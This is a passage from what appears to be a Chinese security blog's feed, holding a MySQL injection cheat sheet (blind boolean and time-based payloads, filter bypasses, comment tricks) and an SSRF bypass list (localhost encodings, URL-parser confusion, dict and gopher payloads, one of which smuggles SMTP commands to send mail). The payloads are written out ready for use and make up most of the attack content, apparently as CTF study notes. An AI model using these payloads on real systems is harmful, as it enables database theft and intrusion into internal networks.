Double</td><td>1e308 cot exp pow</td><td>[5.5.5, 5.5.48]</td><td>✔️</td><td></td><td></td><td></td><td></td><td>MYSQL_ERRMSG_SIZE</td><td></td></tr><tr><td>数据溢出 - BIGINT</td><td></td><td>[5.5.5, 5.5.48]</td><td>✔️</td><td></td><td></td><td></td><td></td><td>MYSQL_ERRMSG_SIZE</td><td></td></tr><tr><td>几何对象</td><td>geometrycollection linestring multipoint multipolygon multilinestring polygon</td><td>[?, 5.5.48]</td><td>✔️</td><td></td><td></td><td></td><td></td><td>244</td><td></td></tr><tr><td>空间函数 Geohash</td><td>ST_LatFromGeoHash ST_LongFromGeoHash ST_PointFromGeoHash</td><td>[5.7, ?)</td><td></td><td></td><td>✔️</td><td>✔️</td><td>128</td><td></td><td></td></tr><tr><td>GTID</td><td>gtid_subset gtid_subtract</td><td>[5.6.5, ?)</td><td></td><td>✔️</td><td>✔️</td><td>✔️</td><td>200</td><td></td><td></td></tr><tr><td>JSON</td><td>json_*</td><td>[5.7.8, 5.7.11]</td><td></td><td></td><td>✔️</td><td></td><td>200</td><td></td><td></td></tr><tr><td>UUID</td><td>uuid_to_bin bin_to_uuid</td><td>[8.0, ?)</td><td></td><td></td><td></td><td>✔️</td><td>128</td><td></td><td></td></tr><tr><td>XPath</td><td>extractvalue updatexml</td><td>[5.1.5, ?)</td><td>✔️</td><td>✔️</td><td>✔️</td><td>✔️</td><td>32</td><td></td><td></td></tr></tbody></table><p>摘自——<a href="https://blog.sari3l.com/posts/9622f295/">Mysql 注入基础小结</a></p><hr><h3 id="Blind-Based"><a href="#Blind-Based" class="headerlink" title="Blind Based"></a>Blind Based</h3><h4 id="Boolean（1-or-0）"><a href="#Boolean（1-or-0）" class="headerlink" title="Boolean（1 or 0）"></a>Boolean（1 or 0）</h4><ul><li><code>id=87 and length(user())&gt;0</code></li><li><code>id=87 and length(user())&gt;100</code></li><li><code>id=87 and ascii(mid(user(),1,1))&gt;100</code></li><li><code>id=87 or ((select user()) regexp binary &#39;^[a-z]&#39;)</code></li></ul><h4 id="Time（无回显）"><a href="#Time（无回显）" class="headerlink" title="Time（无回显）"></a>Time（无回显）</h4><ul><li><code>id=87 and if(length(user())&gt;0, sleep(10), 1)=1</code></li><li><code>id=87 and if(length(user())&gt;100, sleep(10), 1)=1</code></li><li><code>id=87 and if(ascii(mid(user(),1,1))&gt;100, sleep(10), 1)=1</code></li></ul><h3 id="Common-Bypass"><a href="#Common-Bypass" class="headerlink" title="Common Bypass"></a>Common Bypass</h3><h4 id="and-or"><a href="#and-or" class="headerlink" title="and / or"></a>and / or</h4><ol><li>双写 anandd、oorr</li><li>使用运算符代替 &amp;&amp;、||</li><li>直接拼接 = 号，such as <code>?id=1=(condition)</code></li><li>其他方法，such as <code>?id=1^(condition)</code></li><li>大小写</li><li>urlencode</li></ol><h4 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h4><ol><li>多层空格嵌套</li><li>改用 +</li><li>使用注释 /**/</li><li>and / or 后面可以跟上偶数个 !、~ 可以替代空格，也可以混合使用（规律又不同）</li><li><code>%09, %0a, %0b, %0c, %0d, %a0</code> 等部分不可见字符可也代替空格</li></ol><p>such as <code>select * from user where username=&#39;admin&#39;union(select+title,content/**/from/*!article*/where/**/id=&#39;1&#39;and!!!!~~1=1)</code></p><h4 id="括号"><a href="#括号" class="headerlink" title="括号"></a>括号</h4><ul><li>order by 大小比较盲注</li></ul><p>不懂QAQ，求教</p><h4 id="逗号"><a href="#逗号" class="headerlink" title="逗号"></a>逗号</h4><ol><li>改用盲注</li><li><code>UNION SELECT 1,2,3</code> =&gt; <code>UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c)</code></li><li><code>mid(user(), 1, 1)</code> =&gt; <code>mid(user() from 1 for 1)</code></li><li><code>LIMIT N, M</code> =&gt; <code>LIMIT M OFFSET N</code></li></ol><h4 id="其他系统关键字"><a href="#其他系统关键字" class="headerlink" title="其他系统关键字"></a>其他系统关键字</h4><ol><li>双写绕过关键字过滤</li><li>使用同义函数 / 语句代替，如 if 函数可用<code>case when condition then 1 else 0 end</code>语句代替</li><li>大小写</li><li>urlencode</li></ol><h4 id="单双引号被过滤-拦截-转义"><a href="#单双引号被过滤-拦截-转义" class="headerlink" title="单双引号被过滤 / 拦截 / 转义"></a>单双引号被过滤 / 拦截 / 转义</h4><ol><li>需要跳出单引号的情况：尝试是否存在编码问题而产生的SQL注入</li><li>不需要跳出单引号的情况：字符串可用十六进制表示，也可通过进制转换函数表示成其他进制，汝 base_con</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">十进制转换成二进制</span><br><span class="line">select bin(5);</span><br><span class="line">十进制转换成八进制</span><br><span class="line">select oct(5);</span><br><span class="line">十进制转换成十六进制</span><br><span class="line">select hex(5);</span><br><span class="line">二进制转换成十进制</span><br><span class="line">select conv(&#39;101&#39;,2,10);</span><br><span class="line">十进制转换成十六进制</span><br><span class="line">select conv(&#39;20&#39;,10,16);</span><br><span class="line">还原十六进制</span><br><span class="line">unhex(conv(DEC_DATA,10,16))</span><br></pre></td></tr></table></figure><h4 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h4><table><thead><tr><th>代替字符</th><th>数</th><th>代替字符</th><th>数</th><th>字</th><th>代替字符</th><th>数</th><th>字</th></tr></thead><tbody><tr><td>false、!pi()</td><td>0</td><td>ceil(pi()*pi())</td><td>10</td><td>A</td><td>ceil((pi()+pi())*pi())</td><td>20</td><td>K</td></tr><tr><td>true、!(!pi())</td><td>1</td><td>ceil(pi()*pi())+true</td><td>11</td><td>B</td><td>ceil(ceil(pi())*version())</td><td>21</td><td>L</td></tr><tr><td>true+true</td><td>2</td><td>ceil(pi()+pi()+version())</td><td>12</td><td>C</td><td>ceil(pi()*ceil(pi()+pi()))</td><td>22</td><td>M</td></tr><tr><td>floor(pi())、~~pi()</td><td>3</td><td>floor(pi()*pi()+pi())</td><td>13</td><td>D</td><td>ceil((pi()+ceil(pi()))*pi())</td><td>23</td><td>N</td></tr><tr><td>ceil(pi())</td><td>4</td><td>ceil(pi()*pi()+pi())</td><td>14</td><td>E</td><td>ceil(pi())*ceil(version())</td><td>24</td><td>O</td></tr><tr><td>floor(version()) //注意版本</td><td>5</td><td>ceil(pi()*pi()+version())</td><td>15</td><td>F</td><td>floor(pi()*(version()+pi()))</td><td>25</td><td>P</td></tr><tr><td>ceil(version())</td><td>6</td><td>floor(pi()*version())</td><td>16</td><td>G</td><td>floor(version()*version())</td><td>26</td><td>Q</td></tr><tr><td>ceil(pi()+pi())</td><td>7</td><td>ceil(pi()*version())</td><td>17</td><td>H</td><td>ceil(version()*version())</td><td>27</td><td>R</td></tr><tr><td>floor(version()+pi())</td><td>8</td><td>ceil(pi()*version())+true</td><td>18</td><td>I</td><td>ceil(pi()*pi()*pi()-pi())</td><td>28</td><td>S</td></tr><tr><td>floor(pi()*pi())</td><td>9</td><td>floor((pi()+pi())*pi())</td><td>19</td><td>J</td><td>floor(pi()*pi()*floor(pi()))</td><td>29</td><td>T</td></tr></tbody></table><hr><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">--</span><br><span class="line">&#x2F;*(MySQL-5.1)</span><br><span class="line">&#x2F;**&#x2F;(一个 *&#x2F; 可以闭合前面多个&#x2F;*)</span><br><span class="line">;%00(PDO支援多語句)</span><br><span class="line">&#96;(MySQL &lt;&#x3D; 5.5)</span><br><span class="line">&#39;or 1&#x3D;1;%00</span><br><span class="line">&#39;or 1&#x3D;1 union select 1,2&#96;&#39;</span><br><span class="line">&#39;or 1&#x3D;1 #</span><br><span class="line">&#39;&#x2F;*!50000or*&#x2F; 1&#x3D;1 -- -      &#x2F;&#x2F;版本号为5.1.38时只要小于50138</span><br><span class="line">&#39;&#x2F;*!or*&#x2F; 1&#x3D;1 -- -</span><br></pre></td></tr></table></figure><h4 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h4><h5 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h5><table><thead><tr><th>运算符</th><th>说明</th><th>运算符</th><th>说明</th></tr></thead><tbody><tr><td>&amp;&amp;</td><td>与，同and</td><td>||</td><td>或，同or</td></tr><tr><td>!</td><td>非，同not</td><td>~</td><td>一元比特反转</td></tr><tr><td>^</td><td>异或，同xor</td><td>+</td><td>加，可替代空格，如 <code>select+user()</code></td></tr></tbody></table><h5 id="系统信息函数"><a href="#系统信息函数" class="headerlink" title="系统信息函数"></a>系统信息函数</h5><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>USER()</td><td>获取当前操作句柄的用户名，同 SESSION_USER()、CURRENT_USER()，有时也用 SYSTEM_USER()</td></tr><tr><td>DATABASE()</td><td>获取当前选择的数据库名，同 SCHEMA()</td></tr><tr><td>VERSION()</td><td>获取当前版本信息</td></tr></tbody></table><h5 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h5><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>ORD(str)</td><td>返回字符串第一个字符的ASCII值</td></tr><tr><td>OCT(N)</td><td>以字符串形式返回 <code>N</code> 的八进制数，<code>N</code> 是一个BIGINT 型数值，作用相当于<code>CONV(N,10,8)</code></td></tr><tr><td>HEX(N_S)</td><td>参数为字符串时，返回 <code>N_or_S</code> 的16进制字符串形式，为数字时，返回其16进制数形式</td></tr><tr><td>UNHEX(str)</td><td><code>HEX(str)</code> 的逆向函数。将参数中的每一对16进制数字都转换为10进制数字，然后再转换成 ASCII 码所对应的字符</td></tr><tr><td>BIN(N)</td><td>返回十进制数值 <code>N</code> 的二进制数值的字符串表现形式</td></tr><tr><td>ASCII(str)</td><td>同<code>ORD(string)</code></td></tr><tr><td>CONV(N,from_base,to_base)</td><td>将数值型参数 <code>N</code> 由初始进制 <code>from_base</code> 转换为目标进制 <code>to_base</code> 的形式并返回</td></tr><tr><td>CHAR(N,… [USING charset_name])</td><td>将每一个参数 <code>N</code> 都解释为整数，返回由这些整数在 ASCII 码中所对应字符所组成的字符串</td></tr></tbody></table><h5 id="字符截取-拼接"><a href="#字符截取-拼接" class="headerlink" title="字符截取/拼接"></a>字符截取/拼接</h5><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>SUBSTR(str,N_start,N_length)</td><td>对指定字符串进行截取，为SUBSTRING的简单版</td></tr><tr><td>SUBSTRING()</td><td>多种格式<code>SUBSTRING(str,pos)、SUBSTRING(str FROM pos)、SUBSTRING(str,pos,len)、SUBSTRING(str FROM pos FOR len)</code></td></tr><tr><td>RIGHT(str,len)</td><td>对指定字符串从最右边截取指定长度</td></tr><tr><td>LEFT(str,len)</td><td>对指定字符串从最左边截取指定长度</td></tr><tr><td>RPAD(str,len,padstr)</td><td>在 <code>str</code> 右方补齐 <code>len</code> 位的字符串 <code>padstr</code>，返回新字符串。如果 <code>str</code> 长度大于 <code>len</code>，则返回值的长度将缩减到 <code>len</code> 所指定的长度</td></tr><tr><td>LPAD(str,len,padstr)</td><td>与RPAD相似，在<code>str</code>左边补齐</td></tr><tr><td>MID(str,pos,len)</td><td>同于 <code>SUBSTRING(str,pos,len)</code></td></tr><tr><td>INSERT(str,pos,len,newstr)</td><td>在原始字符串 <code>str</code> 中，将自左数第 <code>pos</code> 位开始，长度为 <code>len</code> 个字符的字符串替换为新字符串 <code>newstr</code>，然后返回经过替换后的字符串。<code>INSERT(str,len,1,0x0)</code>可当做截取函数</td></tr><tr><td>CONCAT(str1,str2…)</td><td>函数用于将多个字符串合并为一个字符串</td></tr><tr><td>GROUP_CONCAT(…)</td><td>返回一个字符串结果，该结果由分组中的值连接组合而成</td></tr><tr><td>MAKE_SET(bits,str1,str2,…)</td><td>根据参数1，返回所输入其他的参数值。可用作布尔盲注，如：<code>EXP(MAKE_SET((LENGTH(DATABASE())&gt;8)+1,&#39;1&#39;,&#39;710&#39;))</code></td></tr></tbody></table><h5 id="常见全局变量"><a href="#常见全局变量" class="headerlink" title="常见全局变量"></a>常见全局变量</h5><table><thead><tr><th>变量</th><th>说明</th><th>变量</th><th>说明</th></tr></thead><tbody><tr><td>@@VERSION</td><td>返回版本信息</td><td>@@HOSTNAME</td><td>返回安装的计算机名称</td></tr><tr><td>@@GLOBAL.VERSION</td><td>同<code>@@VERSION</code></td><td>@@BASEDIR</td><td>返回MYSQL绝对路径</td></tr></tbody></table><p>可以用 <code>SHOW GLOBAL VARIABLES;</code> 查看全部全局变量</p><h5 id="其他常用函数-语句"><a href="#其他常用函数-语句" class="headerlink" title="其他常用函数 / 语句"></a>其他常用函数 / 语句</h5><table><thead><tr><th>函数/语句</th><th>说明</th></tr></thead><tbody><tr><td>LENGTH(str)</td><td>返回字符串的长度</td></tr><tr><td>PI()</td><td>返回π的具体数值</td></tr><tr><td>REGEXP “statement”</td><td>正则匹配数据，返回值为布尔值</td></tr><tr><td>LIKE “statement”</td><td>匹配数据，%代表任意内容。返回值为布尔值</td></tr><tr><td>RLIKE “statement”</td><td>与regexp相同</td></tr><tr><td>LOCATE(substr,str,[pos])</td><td>返回子字符串第一次出现的位置</td></tr><tr><td>POSITION(substr IN str)</td><td>等同于 <code>LOCATE()</code></td></tr><tr><td>LOWER(str)</td><td>将字符串的大写字母全部转成小写。同：<code>LCASE(str)</code></td></tr><tr><td>UPPER(str)</td><td>将字符串的小写字母全部转成大写。同：<code>UCASE(str)</code></td></tr><tr><td>ELT(N,str1,str2,str3,…)</td><td>与<code>MAKE_SET(bit,str1,str2...)</code>类似，根据<code>N</code>返回参数值</td></tr><tr><td>NULLIF(expr1,expr2)</td><td>若expr1与expr2相同，则返回expr1，否则返回NULL</td></tr><tr><td>CHARSET(str)</td><td>返回字符串使用的字符集</td></tr><tr><td>DECODE(<em>crypt_str</em>,<em>pass_str</em>)</td><td>使用 pass_str 作为密码，解密加密字符串 crypt_str。加密函数：<code>ENCODE(str,pass_str)</code></td></tr></tbody></table><hr>]]></content>
      
      
      <categories>
          
          <category> 智慧的收藏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF的一些tricks</title>
      <link href="2021/04/25/SSRF%E7%9A%84%E4%B8%80%E4%BA%9Btricks/"/>
      <url>2021/04/25/SSRF%E7%9A%84%E4%B8%80%E4%BA%9Btricks/</url>
      
        <content type="html"><![CDATA[<p>SSRF 是什么？简单地来说：利用一个可以发起网络请求的服务当作跳板来攻击内部其他服务</p><p>可以用来：</p><ul><li>探测内网信息</li><li>攻击内网或本地其他服务</li><li>穿透防火墙</li></ul><p>寻找方法：</p><ul><li>能够对外发起网络请求的地方</li><li>请求远程服务器资源的地方</li><li>数据库内置功能</li><li>邮件系统</li><li>文件处理</li><li>在线处理工具</li></ul><h2 id="一些绕过的方法"><a href="#一些绕过的方法" class="headerlink" title="一些绕过的方法"></a>一些绕过的方法</h2><h3 id="0x00-攻击本地"><a href="#0x00-攻击本地" class="headerlink" title="0x00 攻击本地"></a>0x00 攻击本地</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1:80</span><br><span class="line">http:&#x2F;&#x2F;localhost:22</span><br></pre></td></tr></table></figure><h3 id="0x01-利用ipv6"><a href="#0x01-利用ipv6" class="headerlink" title="0x01 利用ipv6"></a>0x01 利用ipv6</h3><p>利用[::]绕过localhost</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[::1]&#x2F; &gt;&gt;&gt; http:&#x2F;&#x2F;127.0.0.1</span><br><span class="line">http:&#x2F;&#x2F;[::]&#x2F;  &gt;&gt;&gt;  http:&#x2F;&#x2F;0.0.0.0</span><br></pre></td></tr></table></figure><p>也有 <code>http://0000::1:80/</code> 这种</p><h3 id="0x02-利用"><a href="#0x02-利用" class="headerlink" title="0x02 利用@"></a>0x02 利用@</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com@127.0.0.1</span><br></pre></td></tr></table></figure><h3 id="0x03-利用短地址"><a href="#0x03-利用短地址" class="headerlink" title="0x03 利用短地址"></a>0x03 利用短地址</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;dwz.cn&#x2F;11SMa  &gt;&gt;&gt;  http:&#x2F;&#x2F;127.0.0.1</span><br></pre></td></tr></table></figure><h3 id="0x04-利用特殊域名"><a href="#0x04-利用特殊域名" class="headerlink" title="0x04 利用特殊域名"></a>0x04 利用特殊域名</h3><p>利用的原理是DNS解析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1.xip.io&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;www.owasp.org.127.0.0.1.xip.io&#x2F;</span><br></pre></td></tr></table></figure><h3 id="0x05-利用DNS解析"><a href="#0x05-利用DNS解析" class="headerlink" title="0x05 利用DNS解析"></a>0x05 利用DNS解析</h3><p>在域名上设置A记录，指向127.0.1</p><h3 id="0x06-利用修改上传"><a href="#0x06-利用修改上传" class="headerlink" title="0x06 利用修改上传"></a>0x06 利用修改上传</h3><p>比如可以修改 “type=file” 为 “type=url”<br>将图片文件修改为URL，即可能触发 SSRF</p><h3 id="0x07-利用Enclosed-alphanumerics"><a href="#0x07-利用Enclosed-alphanumerics" class="headerlink" title="0x07 利用Enclosed alphanumerics"></a>0x07 利用Enclosed alphanumerics</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">利用Enclosed alphanumerics</span><br><span class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com</span><br><span class="line">List:</span><br><span class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ </span><br><span class="line">⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ </span><br><span class="line">⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ </span><br><span class="line">⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ </span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ </span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure><h3 id="0x08-利用句号"><a href="#0x08-利用句号" class="headerlink" title="0x08 利用句号"></a>0x08 利用句号</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127。0。0。1  &gt;&gt;&gt;  127.0.0.1</span><br></pre></td></tr></table></figure><h3 id="0x09-利用进制转换"><a href="#0x09-利用进制转换" class="headerlink" title="0x09 利用进制转换"></a>0x09 利用进制转换</h3><p>可以是十六进制，八进制等</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">115.239.210.26  &gt;&gt;&gt;  16373751032</span><br><span class="line">http:&#x2F;&#x2F;016373751032&#x2F;</span><br></pre></td></tr></table></figure><p>首先把这四段数字给分别转成16进制，结果：73 ef d2 1a<br>然后把 73efd21a 这十六进制一起转换成八进制<br>记得访问的时候加 0 表示使用八进制(可以是一个0也可以是多个0，跟XSS中多加几个0来绕过过滤一样)，十六进制加0x</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;0177.0.0.1&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;2130706433&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;192.168.0.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;3232235521&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;192.168.1.1  &gt;&gt;&gt;  http:&#x2F;&#x2F;3232235777&#x2F;</span><br></pre></td></tr></table></figure><h3 id="0x0A-利用特殊地址"><a href="#0x0A-利用特殊地址" class="headerlink" title="0x0A 利用特殊地址"></a>0x0A 利用特殊地址</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0&#x2F;</span><br></pre></td></tr></table></figure><h3 id="0x0B-利用协议"><a href="#0x0B-利用协议" class="headerlink" title="0x0B 利用协议"></a>0x0B 利用协议</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Dict:&#x2F;&#x2F;</span><br><span class="line">dict:&#x2F;&#x2F;&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;&#x2F;d:&lt;word&gt;</span><br><span class="line">ssrf.php?url&#x3D;dict:&#x2F;&#x2F;attacker:11111&#x2F;</span><br><span class="line">SFTP:&#x2F;&#x2F;</span><br><span class="line">ssrf.php?url&#x3D;sftp:&#x2F;&#x2F;example.com:11111&#x2F;</span><br><span class="line">TFTP:&#x2F;&#x2F;</span><br><span class="line">ssrf.php?url&#x3D;tftp:&#x2F;&#x2F;example.com:12346&#x2F;TESTUDPPACKET</span><br><span class="line">LDAP:&#x2F;&#x2F;</span><br><span class="line">ssrf.php?url&#x3D;ldap:&#x2F;&#x2F;localhost:11211&#x2F;%0astats%0aquit</span><br><span class="line">Gopher:&#x2F;&#x2F;</span><br><span class="line">ssrf.php?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:25&#x2F;xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a</span><br></pre></td></tr></table></figure><h3 id="0x0C-0-0-0-0"><a href="#0x0C-0-0-0-0" class="headerlink" title="0x0C 0.0.0.0"></a>0x0C 0.0.0.0</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;0.0.0.0&#x2F;</span><br></pre></td></tr></table></figure><p>这个方法似乎只能在Linux下使用，Windows并不认识这个ip</p><h3 id="0x0D-利用curl和其他库解析url的差异性"><a href="#0x0D-利用curl和其他库解析url的差异性" class="headerlink" title="0x0D 利用curl和其他库解析url的差异性"></a>0x0D 利用curl和其他库解析url的差异性</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;foo@127.0.0.1:80@www.google.com&#x2F;</span><br></pre></td></tr></table></figure><p><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf</a> 有提到，不过这个方法在curl较新的版本里被修掉了</p><p><img src="https://i.loli.net/2021/04/25/qwN3UOZzeKaXAEB.jpg"></p><h3 id="0x0E-DNS-Rebinding"><a href="#0x0E-DNS-Rebinding" class="headerlink" title="0x0E DNS Rebinding"></a>0x0E DNS Rebinding</h3><p>懒🐕表示还没搞，以后补上</p><h3 id="0x0F-127-1"><a href="#0x0F-127-1" class="headerlink" title="0x0F 127.1"></a>0x0F 127.1</h3><p>在 <code>[网鼎杯 2020 玄武组]SSRFMe</code> 这道题中有这么个点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.1&#x2F;</span><br></pre></td></tr></table></figure><ul><li><code>ip2long(&#39;127.1&#39;)</code>会返回<code>false</code>，这里可以绕过过滤</li><li>但是<code>gethostbyname</code>在Linux下会把<code>127.1</code>变为<code>127.0.0.1</code>，所以这题是无法使用的。不过windows下经过<code>gethostbyname</code>后依然是<code>127.1</code></li><li>curl是支持<code>127.1</code>这样的写法的，但这样发出去的http请求是有问题的。因为http包中的host头被设为了<code>127.1</code>，apache会返回一个400 Bad Request</li><li>既然是http包的问题，那么用gopher协议构造一个正常的http请求即可。不过这因为<code>gethostbyname</code>的原因，这个方法这里用不了</li></ul><h3 id="0x10-127-0-0-1"><a href="#0x10-127-0-0-1" class="headerlink" title="0x10 127.0.0.1."></a>0x10 127.0.0.1.</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1.</span><br></pre></td></tr></table></figure><p>不过curl方法不支持这种写法</p><h3 id="0x11-http"><a href="#0x11-http" class="headerlink" title="0x11 http:///"></a>0x11 http:///</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;&#x2F;127.0.0.1</span><br></pre></td></tr></table></figure><p>依然是 <code>[网鼎杯 2020 玄武组]SSRFMe</code></p><hr><ul><li>这个trick也非常有意思，之前一直以为只有浏览器才会解析这样host为空的畸形url，在P师傅小密圈地旧帖里面Li4n0师傅提到curl和git也会按照浏览器的方式解析，测试一下发现直接用curl会卡在那，但是php的libcurl就可以…</li><li>用<code>parse_url</code>解析这样的畸形url会返回<code>false</code>，然后<code>$hostname=$url_parse[&#39;host&#39;];</code>会返回<code>null</code>（神奇的php)</li><li>接着又是一个windows和linux下php的差异，windows下<code>gethostbyname(null);</code>会返回本机ip，导致后面无法绕过ip检测。然而linux下并没有这样的特性，<code>gethostbyname</code>会返回<code>null</code>，绕过ip检测</li></ul><hr><p>整理了一下SSRF的一些tricks。</p>]]></content>
      
      
      <categories>
          
          <category> 智慧的收藏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 奇技淫巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaWeb坑</title>
      <link href="2021/04/25/JavaWeb%E5%9D%91/"/>
      <url>2021/04/25/JavaWeb%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p>开个新坑，学 Java web 了，慢慢更了……</p><hr>]]></content>
      
      
      <categories>
          
          <category> 坑 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>说话的艺术</title>
      <link href="2021/04/25/%E8%AF%B4%E8%AF%9D%E7%9A%84%E8%89%BA%E6%9C%AF/"/>
